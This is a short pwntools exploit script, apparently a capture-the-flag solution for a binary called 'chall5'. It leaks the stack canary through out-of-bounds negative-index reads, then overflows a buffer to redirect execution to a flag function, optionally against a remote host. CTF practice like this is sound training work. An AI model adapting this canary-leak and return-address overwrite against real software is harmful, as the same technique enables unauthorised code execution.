#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"

if args.REMOTE:
    io = remote("209.126.8.12", 2227)
else:
    io = process("./chall5")

def add(number):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(number))
    
def view(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(index))

def exit(name):
    io.sendlineafter(b"> ", b"3")
    io.sendafter(b": ", name)


io.sendafter(b": ", b"AAAA")
view(-81)
io.recvuntil(b"is ")
canary_1 = int(io.recvline(keepends=False))
if canary_1 < 0:
    canary_1 = (0x100000000 + canary_1) & 0xffffffff
view(-82)
io.recvuntil(b"is ")
canary_2 = int(io.recvline(keepends=False))
if canary_2 < 0:
    canary_2 = (0x100000000 + canary_2) & 0xffffffff
canary = (canary_1 << 32) + canary_2
#log.info("canary_1 = {}".format(hex(canary_1)))
#log.info("canary_2 = {}".format(hex(canary_2)))
log.info("canary = {}".format(hex(canary)))

flag_func = 0x40129b
payload = b"A"*32 + b"\x00"*8 + p64(canary) + b"\x00"*8 + p64(flag_func)

exit(payload)
print(io.recv(1024))

io.interactive()
